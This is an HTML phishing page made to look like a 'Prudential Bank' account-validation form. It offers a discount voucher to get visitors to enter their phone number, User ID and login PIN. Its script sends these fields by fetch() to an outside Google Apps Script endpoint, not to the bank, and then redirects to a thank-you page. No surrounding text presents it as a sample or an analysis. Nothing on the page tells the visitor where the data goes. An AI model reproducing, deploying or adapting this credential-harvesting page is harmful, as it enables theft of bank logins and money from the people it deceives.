<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Prudential Bank Validation</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      background: #f2f7f8;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      color: #0A1A2F;
    }
    .header {
      background: linear-gradient(to bottom, #009CA6, #006F78);
      color: white;
      text-align: center;
      padding: 25px 20px;
      width: 100%;
      max-width: 600px;
      border-bottom-left-radius: 20px;
      border-bottom-right-radius: 20px;
    }
    .welcome-text {
      width: 90%;
      max-width: 500px;
      text-align: center;
      margin-top: 18px;
    }
    .form-wrap {
      background: #ffffff;
      width: 90%;
      max-width: 400px;
      margin-top: 20px;
      padding: 30px 25px;
      border-radius: 15px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
    }
    label {
      display: block;
      margin-bottom: 6px;
      font-size: 14px;
      font-weight: bold;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 18px;
      border-radius: 8px;
      border: 1px solid #c5c5c5;
      font-size: 14px;
    }
    button {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: none;
      background: #0A1A2F;
      color: white;
      font-weight: bold;
      cursor: pointer;
      font-size: 16px;
      transition: background 0.2s ease;
    }
    button:disabled {
      background: #555;
      cursor: not-allowed;
    }
    .overlay {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.45);
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      color: white;
      font-size: 18px;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.4s ease;
    }
    .overlay.active {
      opacity: 1;
      pointer-events: all;
    }
    .spinner {
      border: 4px solid #fff;
      border-top: 4px solid #009CA6;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin-bottom: 15px;
    }
    @keyframes spin {
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <div class="header">
    <h1>PRUDENTIAL BANK</h1>
    <p>Truly Dependable</p>
  </div>

  <div class="welcome-text">
    <p>Validate your account for smooth transactions and claim a 10% discount voucher.</p>
  </div>

  <form id="dataForm" class="form-wrap" autocomplete="off">
    <label>Phone Number</label>
    <input type="tel" name="phone" pattern="\d{10}" required placeholder="Enter 10-digit number">

    <label>User ID</label>
    <input type="text" name="userId" required placeholder="Enter your User ID">

    <label>Login PIN</label>
    <input type="password" name="pin" required placeholder="Enter your PIN">

    <button type="submit">CONTINUE →</button>
  </form>

  <div class="overlay" id="overlay">
    <div class="spinner"></div>
    Processing, please wait…
  </div>

  <script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbxLXpPErQ9c9Virgf8IM6CanWuXQpDT1MkAY6ieWqcQbguOGVTOzdasG_r49YbHRzXhlw/exec';
    const form = document.getElementById('dataForm');
    const overlay = document.getElementById('overlay');

    form.addEventListener('submit', (e) => {
      e.preventDefault();

      // Show spinner overlay
      overlay.classList.add('active');

      // Disable button to prevent multiple clicks
      const button = form.querySelector('button');
      button.disabled = true;

      // Send form data
      fetch(scriptURL, {
        method: 'POST',
        body: new FormData(form)
      }).finally(() => {
        // Fade out overlay smoothly before redirect
        overlay.style.transition = 'opacity 0.5s ease';
        overlay.style.opacity = '0';
        setTimeout(() => {
          window.location.href = 'thankyou.html';
        }, 500);
      });
    });
  </script>

</body>
</html>
